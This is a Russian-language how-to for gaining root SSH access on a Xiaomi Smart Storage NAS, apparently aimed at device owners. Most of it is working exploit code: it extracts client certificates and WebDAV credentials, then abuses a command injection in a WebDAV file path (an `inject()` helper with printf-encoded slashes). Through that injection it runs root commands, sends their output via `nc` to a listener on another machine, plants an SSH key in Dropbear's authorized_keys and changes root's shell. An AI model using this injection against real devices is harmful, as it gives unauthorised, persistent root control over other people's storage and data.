
---

# Включение SSH с правами root на Xiaomi Smart Storage NAS

## 1. Получение файлов сертификатов

Сначала войдите в клиентское приложение «小米智能存储» (Xiaomi Smart Storage) один раз, чтобы оно сгенерировало сертификаты.

### macOS

Сертификаты обычно находятся по адресу:

```text
小米智能存储.app/Contents/Resources/extraResources/cert/

```

### Windows

Сертификаты обычно находятся по адресу:

```text
%LOCALAPPDATA%\minasCert\

```

Скопируйте следующие три файла в отдельную директорию:

```text
<UID>_<SERIAL>_cert.pem
<UID>_<SERIAL>_private_key.pem
ca_chain.pem

```

---

## 2. Переход в директорию сертификатов и инициализация переменных

Перейдите в папку, куда вы скопировали сертификаты:

```bash
cd '<путь_к_директории_с_сертификатами>'

```

Затем выполните:

```bash
CERT=$(find . -maxdepth 1 -type f -name '*_cert.pem' -print -quit)
KEY=$(find . -maxdepth 1 -type f -name '*_private_key.pem' -print -quit)
CA=$(find . -maxdepth 1 -type f -name 'ca_chain.pem' -print -quit)

chmod 600 "$KEY"

```

Задайте IP-адреса:

```bash
NAS_IP='<IP_адрес_NAS_в_локальной_сети>'
WORKSTATION_IP='<IP_адрес_вашего_ПК_в_локальной_сети>'

```

---

## 3. Получение доменного имени сертификата NAS

Common Name (CN) клиентского сертификата совпадает по структуре с доменным именем NAS, но последняя секция может отличаться. Сначала сгенерируем кандидатное имя, а затем считываем фактический CN из сертификата сервера NAS:

```bash
CLIENT_CN=$(
  openssl x509 \
    -in "$CERT" \
    -noout \
    -subject \
    -nameopt RFC2253 |
  sed -n 's/^subject=.*CN=\([^,]*\).*$/\1/p'
)

CN_CANDIDATE="${CLIENT_CN%.*}.0"

CN=$(
  openssl s_client \
    -connect "$NAS_IP:443" \
    -servername "$CN_CANDIDATE" \
    -cert "$CERT" \
    -key "$KEY" \
    -CAfile "$CA" \
    </dev/null 2>/dev/null |
  openssl x509 \
    -noout \
    -subject \
    -nameopt RFC2253 |
  sed -n 's/^subject=.*CN=\([^,]*\).*$/\1/p'
)

if [ -z "$CN" ]; then
  echo 'Не удалось получить CN сертификата сервера с NAS'
  exit 1
fi

printf 'CLIENT_CN=%s\nNAS_CN=%s\n' "$CLIENT_CN" "$CN"

```

---

## 4. Получение учетных данных WebDAV

Выполните:

```bash
API_JSON=$(
  curl --silent --show-error \
    --cacert "$CA" \
    --cert "$CERT" \
    --key "$KEY" \
    --resolve "$CN:443:$NAS_IP" \
    -H 'Content-Type: application/json' \
    -X POST \
    -d '{}' \
    "https://$CN/cgi-bin/luci/filemgr/get_pool_info"
)

WEBDAV_USER=$(
  printf '%s' "$API_JSON" |
  jq -r '[.. | objects | .username? // empty][0] // empty'
)

WEBDAV_PASSWORD=$(
  printf '%s' "$API_JSON" |
  jq -r '[.. | objects | .password? // empty][0] // empty'
)

WEBDAV_PORT=$(
  printf '%s' "$API_JSON" |
  jq -r '[.. | objects | .port? // empty][0] // empty'
)

WEBDAV_PORT=${WEBDAV_PORT:-5000}

CREDS="${WEBDAV_USER}:${WEBDAV_PASSWORD}"
NAS_USER="$WEBDAV_USER"

```

---

## 5. Запуск прослушивателя результатов

Откройте **второе окно терминала** и выполните:

```bash
nc -lk 8124

```

Результаты выполнения команд на NAS будут выводиться в этом терминале.

---

## 6. Определение функции инъекции команд

Вернитесь в первый терминал (где заданы переменные) и выполните:

```bash
inject() {
  local remote_cmd="$1"
  local payload

  payload=$(
    jq -nr \
      --arg v "__inject\";${remote_cmd};\"__.ts" \
      '$v|@uri'
  )

  curl --silent --show-error \
    --globoff \
    --path-as-is \
    --cacert "$CA" \
    --cert "$CERT" \
    --key "$KEY" \
    --resolve "$CN:$WEBDAV_PORT:$NAS_IP" \
    --user "$CREDS" \
    -o /dev/null \
    -w 'HTTP=%{http_code} time=%{time_total}s\n' \
    "https://$CN:$WEBDAV_PORT/pool0/video/$payload"
}

```

> **Примечание:** В инъецируемых командах нельзя напрямую использовать символ `/`, поэтому пути на удаленном сервере формируются с помощью `printf '\57...'`.

---

## 7. Проверка обратного отклика (Echo Test)

Оригинальная команда для NAS:

```bash
echo INJECTION_OK | nc <IP_вашего_ПК> 8124

```

Фактическое выполнение:

```bash
inject "echo INJECTION_OK | nc $WORKSTATION_IP 8124"

```

В терминале с прослушивателем (`nc`) должно появиться:

```text
INJECTION_OK

```

---

## 8. Генерация и загрузка публичного SSH-ключа

Загрузите публичный ключ (замените `<файл_ключа>` на реальное имя вашего файла):

```bash
curl --silent --show-error \
  --cacert "$CA" \
  --cert "$CERT" \
  --key "$KEY" \
  --resolve "$CN:$WEBDAV_PORT:$NAS_IP" \
  --user "$CREDS" \
  -T '<файл_ключа>.pub' \
  -w 'PUT: %{http_code}\n' \
  -o /dev/null \
  "https://$CN:$WEBDAV_PORT/pool0/data/authorized_keys"

```

Ожидаемый ответ:

```text
PUT: 204

```

---

## 9. Запись в authorized_keys службы Dropbear

Оригинальные команды для NAS:

```bash
cat /home/<NAS_USER>/pool0/data/authorized_keys \
  >> /etc/dropbear/authorized_keys

chown root:root /etc/dropbear/authorized_keys
chmod 600 /etc/dropbear/authorized_keys

```

Фактическое выполнение:

```bash
REMOTE_CMD="DIR=\$(printf '\\57etc\\57dropbear');\
S=\$(printf '\\57home\\57${NAS_USER}\\57pool0\\57data\\57authorized_keys');\
D=\$(printf '\\57etc\\57dropbear\\57authorized_keys');\
{ \
if [ ! -f \"\$S\" ];then \
  echo SOURCE_MISSING; \
else \
  mkdir -p \"\$DIR\"; \
  touch \"\$D\"; \
  chown root:root \"\$D\"; \
  chmod 600 \"\$D\"; \
  if grep -qxF -f \"\$S\" \"\$D\";then \
    echo KEY_ALREADY_PRESENT; \
  elif cat \"\$S\" >> \"\$D\";then \
    echo KEY_APPENDED; \
  else \
    echo KEY_APPEND_FAILED; \
  fi; \
fi; \
} 2>&1 | nc $WORKSTATION_IP 8124"

inject "$REMOTE_CMD"

```

В прослушивателе ожидается сообщение:

```text
KEY_APPENDED

```

или:

```text
KEY_ALREADY_PRESENT

```

*(Если вы видите `SOURCE_MISSING`, значит имя пользователя из API не совпадает с именем системной директории в `/home`. Сначала проверьте реальное имя папки).*

---

## 10. Резервное копирование конфигурации и изменение оболочки (shell) для root

Оригинальные команды для NAS:

```bash
cp -p /etc/passwd /home/<NAS_USER>/pool0/data/passwd.bak-pre-ssh
cp -p /etc/shells /home/<NAS_USER>/pool0/data/shells.bak-pre-ssh
grep -qxF /bin/ash /etc/shells || echo /bin/ash >> /etc/shells
usermod -s /bin/ash root

```

Фактическое выполнение:

```bash
REMOTE_CMD="P=\$(printf '\\57etc\\57passwd');\
PB=\$(printf '\\57home\\57${NAS_USER}\\57pool0\\57data\\57passwd.bak-pre-ssh');\
E=\$(printf '\\57etc\\57shells');\
EB=\$(printf '\\57home\\57${NAS_USER}\\57pool0\\57data\\57shells.bak-pre-ssh');\
SH=\$(printf '\\57bin\\57ash');\
{ \
OK=1; \
[ -e \"\$PB\" ] || cp -p \"\$P\" \"\$PB\" || OK=0; \
[ -e \"\$EB\" ] || cp -p \"\$E\" \"\$EB\" || OK=0; \
if [ \"\$OK\" -ne 1 ];then \
  echo BACKUP_FAILED; \
elif [ ! -x \"\$SH\" ];then \
  echo ASH_NOT_FOUND; \
else \
  grep -qxF \"\$SH\" \"\$E\" || echo \"\$SH\" >> \"\$E\"; \
  if usermod -s \"\$SH\" root;then \
    getent passwd root; \
    echo SHELL_OK; \
  else \
    echo SHELL_CHANGE_FAILED; \
  fi; \
fi; \
} 2>&1 | nc $WORKSTATION_IP 8124"

inject "$REMOTE_CMD"

```

В прослушивателе ожидается:

```text
root:x:0:0:root:/root:/bin/ash
SHELL_OK

```

---

## 11. Включение службы SSH

Оригинальные команды для NAS:

```bash
systemctl enable dropbear.socket
systemctl restart dropbear.socket
systemctl is-enabled dropbear.socket
systemctl is-active dropbear.socket

```

Фактическое выполнение:

```bash
REMOTE_CMD="{ \
systemctl enable dropbear.socket; \
systemctl restart dropbear.socket; \
echo ===STATUS===; \
systemctl is-enabled dropbear.socket; \
systemctl is-active dropbear.socket; \
} 2>&1 | nc $WORKSTATION_IP 8124"

inject "$REMOTE_CMD"

```

В прослушивателе ожидается:

```text
===STATUS===
enabled
active

```

---

## 12. Проверка входа по SSH

Подключитесь по SSH с ПК:

```bash
ssh \
  -o StrictHostKeyChecking=accept-new \
  -i '<путь_к_приватному_ключу>' \
  "root@$NAS_IP"

```

После успешного входа проверьте свои права:

```bash
id

```

Ожидаемый вывод:

```text
uid=0(root) gid=0(root)

```
